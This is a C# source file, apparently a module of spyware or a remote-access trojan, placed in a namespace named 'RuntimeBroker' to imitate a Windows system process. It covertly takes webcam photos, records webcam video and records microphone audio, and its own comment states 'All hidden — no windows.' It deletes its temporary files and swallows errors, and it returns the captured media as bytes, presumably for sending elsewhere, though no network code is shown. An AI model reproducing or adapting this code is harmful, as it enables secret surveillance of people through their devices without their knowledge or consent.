using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using DirectShowLib;
using NAudio.Wave;

namespace RuntimeBroker;

/// <summary>
/// Camera (DirectShowLib) + microphone (NAudio). All hidden — no windows.
/// </summary>
internal static class MediaCapture
{
    // ── camera still → JPEG ──────────────────────────────────────────────
    public static byte[]? CameraPhotoJpeg()
    {
        IFilterGraph2? graph = null;
        ICaptureGraphBuilder2? builder = null;
        IBaseFilter? source = null;
        IBaseFilter? grabberFilter = null;
        ISampleGrabber? grabber = null;
        IMediaControl? control = null;
        var callback = new StillCallback();
        DsDevice[] devs = Array.Empty<DsDevice>();
        try
        {
            devs = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
            if (devs.Length == 0) return null;
            graph = (IFilterGraph2)new FilterGraph();
            builder = (ICaptureGraphBuilder2)new CaptureGraphBuilder2();
            builder.SetFiltergraph(graph);

            int hr = graph.AddSourceFilterForMoniker(devs[0].Mon, null, devs[0].Name, out source);
            DsError.ThrowExceptionForHR(hr);

            grabberFilter = (IBaseFilter)new SampleGrabber();
            grabber = (ISampleGrabber)grabberFilter;
            var mt = new AMMediaType
            {
                majorType = MediaType.Video,
                subType = MediaSubType.RGB24,
                formatType = FormatType.VideoInfo
            };
            hr = grabber.SetMediaType(mt);
            DsError.ThrowExceptionForHR(hr);
            hr = graph.AddFilter(grabberFilter, "Grabber");
            DsError.ThrowExceptionForHR(hr);
            hr = grabber.SetBufferSamples(true);
            DsError.ThrowExceptionForHR(hr);
            hr = grabber.SetOneShot(false);
            DsError.ThrowExceptionForHR(hr);
            hr = grabber.SetCallback(callback, 1);
            DsError.ThrowExceptionForHR(hr);

            hr = builder.RenderStream(PinCategory.Preview, MediaType.Video, source, null, grabberFilter);
            if (hr < 0)
            {
                hr = builder.RenderStream(PinCategory.Capture, MediaType.Video, source, null, grabberFilter);
                DsError.ThrowExceptionForHR(hr);
            }

            // Negotiate size from the connected media type.
            hr = grabber.GetConnectedMediaType(mt);
            DsError.ThrowExceptionForHR(hr);
            var vih = (VideoInfoHeader)Marshal.PtrToStructure(mt.formatPtr, typeof(VideoInfoHeader))!;
            int w = vih.BmiHeader.Width, h = Math.Abs(vih.BmiHeader.Height);
            DsUtils.FreeAMMediaType(mt);
            mt = null;

            control = (IMediaControl)graph;
            hr = control.Run();
            DsError.ThrowExceptionForHR(hr);

            var deadline = DateTime.UtcNow.AddSeconds(10);
            while (callback.Buffer == null && DateTime.UtcNow < deadline)
                Thread.Sleep(100);
            try { control.Stop(); } catch { }
            var buf = callback.Buffer;
            if (buf == null || w <= 0 || h <= 0) return null;

            // RGB24 bottom-up → JPEG.
            using var bmp = new Bitmap(w, h, PixelFormat.Format24bppRgb);
            var bd = bmp.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
            try
            {
                int stride = Math.Abs(bd.Stride);
                int rowBytes = w * 3;
                for (int y = 0; y < h; y++)
                {
                    int srcOff = y * rowBytes;
                    int copy = Math.Min(rowBytes, buf.Length - srcOff);
                    if (copy <= 0) break;
                    Marshal.Copy(buf, srcOff, IntPtr.Add(bd.Scan0, (h - 1 - y) * stride), copy);
                }
            }
            finally { bmp.UnlockBits(bd); }
            // Flip handled by bottom-up copy above.
            using var ms = new MemoryStream();
            bmp.Save(ms, ImageFormat.Jpeg);
            return ms.ToArray();
        }
        catch
        {
            return null;
        }
        finally
        {
            try { control?.Stop(); } catch { }
            if (grabber != null && grabberFilter != null)
            {
                try { grabber.SetCallback(null, 0); } catch { }
            }
            foreach (var o in new object?[] { control, grabber, grabberFilter, builder, source, graph })
                try { if (o != null && Marshal.IsComObject(o)) Marshal.ReleaseComObject(o); } catch { }
            foreach (var d in devs)
                try { d.Dispose(); } catch { }
        }
    }

    private sealed class StillCallback : ISampleGrabberCB
    {
        public volatile byte[]? Buffer;
        public int SampleCB(double sampleTime, IMediaSample sample) => 0;
        public int BufferCB(double sampleTime, IntPtr buffer, int bufferLen)
        {
            try
            {
                if (Buffer == null && bufferLen > 0)
                {
                    var b = new byte[bufferLen];
                    Marshal.Copy(buffer, b, 0, bufferLen);
                    Buffer = b;
                }
            }
            catch { }
            return 0;
        }
    }

    // ── camera video → AVI (seconds) ─────────────────────────────────────
    public static byte[]? CameraVideoAvi(int seconds)
    {
        IFilterGraph2? graph = null;
        ICaptureGraphBuilder2? builder = null;
        IBaseFilter? source = null;
        IBaseFilter? mux = null;
        IFileSinkFilter? sink = null;
        IMediaControl? control = null;
        var tmp = Path.Combine(Path.GetTempPath(), $"rb_vid_{Guid.NewGuid():N}.avi");
        DsDevice[] devs = Array.Empty<DsDevice>();
        try
        {
            devs = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
            if (devs.Length == 0) return null;
            graph = (IFilterGraph2)new FilterGraph();
            builder = (ICaptureGraphBuilder2)new CaptureGraphBuilder2();
            builder.SetFiltergraph(graph);
            int hr = graph.AddSourceFilterForMoniker(devs[0].Mon, null, devs[0].Name, out source);
            DsError.ThrowExceptionForHR(hr);
            // SetOutputFileName creates + inserts its own mux; do not add one manually.
            hr = builder.SetOutputFileName(MediaSubType.Avi, tmp, out mux, out sink);
            DsError.ThrowExceptionForHR(hr);
            hr = builder.RenderStream(PinCategory.Capture, MediaType.Video, source, null, mux);
            if (hr < 0)
            {
                hr = builder.RenderStream(PinCategory.Preview, MediaType.Video, source, null, mux);
                DsError.ThrowExceptionForHR(hr);
            }
            control = (IMediaControl)graph;
            hr = control.Run();
            DsError.ThrowExceptionForHR(hr);
            Thread.Sleep(seconds * 1000);
            try { control.Stop(); } catch { }
            control = null;
            if (!File.Exists(tmp)) return null;
            return File.ReadAllBytes(tmp);
        }
        catch
        {
            return null;
        }
        finally
        {
            try { control?.Stop(); } catch { }
            foreach (var o in new object?[] { control, sink, mux, builder, source, graph })
                try { if (o != null && Marshal.IsComObject(o)) Marshal.ReleaseComObject(o); } catch { }
            foreach (var d in devs)
                try { d.Dispose(); } catch { }
            try { if (File.Exists(tmp)) File.Delete(tmp); } catch { }
        }
    }

    // ── microphone → WAV (seconds) ───────────────────────────────────────
    public static byte[]? MicRecordWav(int seconds)
    {
        try
        {
            if (WaveInEvent.DeviceCount == 0) return null;
            using var waveIn = new WaveInEvent
            {
                DeviceNumber = 0,
                WaveFormat = new WaveFormat(44100, 1)
            };
            using var ms = new MemoryStream();
            using var done = new ManualResetEventSlim(false);
            // Dispose order matters: the writer finalizes the WAV header on
            // dispose, so the bytes are read only after it is closed.
            using (var writer = new WaveFileWriter(ms, waveIn.WaveFormat))
            {
                waveIn.DataAvailable += (_, e) =>
                {
                    try { writer.Write(e.Buffer, 0, e.BytesRecorded); } catch { }
                };
                waveIn.RecordingStopped += (_, _) => done.Set();
                waveIn.StartRecording();
                Thread.Sleep(seconds * 1000);
                try { waveIn.StopRecording(); } catch { }
                done.Wait(TimeSpan.FromSeconds(10));
                writer.Flush();
            }
            var data = ms.ToArray();
            return data.Length > 44 ? data : null;
        }
        catch
        {
            return null;
        }
    }
}
